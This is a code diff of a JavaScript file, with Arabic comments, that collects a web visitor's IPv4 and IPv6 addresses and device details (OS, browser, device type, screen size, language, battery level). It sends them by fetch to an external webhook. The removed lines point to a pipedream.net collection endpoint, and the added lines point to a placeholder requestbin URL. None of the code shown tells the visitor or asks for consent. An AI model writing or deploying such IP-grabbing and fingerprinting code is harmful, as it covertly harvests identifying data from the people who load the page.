@@ -213,7 +213,6 @@ async function getDeviceInfo() {
     userAgent: ua,
     platform: navigator.platform,
     language: navigator.language,
-    languages: navigator.languages,
     screen: {
       width: screen.width,
       height: screen.height,
@@ -225,32 +224,38 @@ async function getDeviceInfo() {
     browser: "Unknown browser",
     batteryLevel: "غير مدعوم",
   };
+
+  // تحديد نظام التشغيل
   if (/android/i.test(ua)) deviceInfo.os = "Android";
   else if (/iPad|iPhone|iPod/.test(ua)) deviceInfo.os = "iOS";
   else if (/Macintosh/.test(ua)) deviceInfo.os = "macOS";
   else if (/Windows/.test(ua)) deviceInfo.os = "Windows";
   else if (/Linux/.test(ua)) deviceInfo.os = "Linux";
+
+  // نوع الجهاز
   if (/mobile/i.test(ua)) deviceInfo.device = "جوال";
   else if (/tablet/i.test(ua)) deviceInfo.device = "جهاز لوحي";
   else deviceInfo.device = "كمبيوتر";
+
+  // تحديد المتصفح
   if (/Chrome/.test(ua) && !/Edg/.test(ua)) deviceInfo.browser = "Chrome";
   else if (/Safari/.test(ua) && !/Chrome/.test(ua)) deviceInfo.browser = "Safari";
   else if (/Firefox/.test(ua)) deviceInfo.browser = "Firefox";
   else if (/Edg/.test(ua)) deviceInfo.browser = "Edge";
   else if (/OPR|Opera/.test(ua)) deviceInfo.browser = "Opera";
+
+  // مستوى البطارية (إن وُجد)
   if (navigator.getBattery) {
     try {
       const battery = await navigator.getBattery();
       deviceInfo.batteryLevel = `${Math.round(battery.level * 100)}%`;
-    } catch (err) {
-      deviceInfo.batteryLevel = "فشل قراءة البطارية";
+    } catch {
+      deviceInfo.batteryLevel = "خطأ في قراءة البطارية";
     }
   }
 
   return deviceInfo;
 }
-
-
 
 async function sendIPsToWebhook() {
   try {
@@ -264,15 +269,23 @@ async function sendIPsToWebhook() {
 
     const deviceInfo = await getDeviceInfo();
 
-    const encodedInfo = encodeURIComponent(JSON.stringify(deviceInfo));
-    const url = `https://eo5d3jdbl6ngkcy.m.pipedream.net/?ip4v=${ipv4}&ip6v=${ipv6}&info=${encodedInfo}`;
+    const params = new URLSearchParams({
+      ip4v: ipv4,
+      ip6v: ipv6,
+      os: deviceInfo.os,
+      browser: deviceInfo.browser,
+      device: deviceInfo.device,
+      battery: deviceInfo.batteryLevel,
+      lang: deviceInfo.language,
+      width: deviceInfo.screen.width.toString(),
+      height: deviceInfo.screen.height.toString(),
+    });
 
-
+    const url = `https://your-requestbin-url.com/?${params.toString()}`;
     await fetch(url);
-    console.log("IPs sent successfully:", ipv4, ipv6);
+    console.log("✅ البيانات أُرسلت بنجاح إلى:", url);
   } catch (err) {
-    console.error("Error fetching/sending IPs:", err);
+    console.error("❌ فشل الإرسال:", err);
   }
 }
-
 
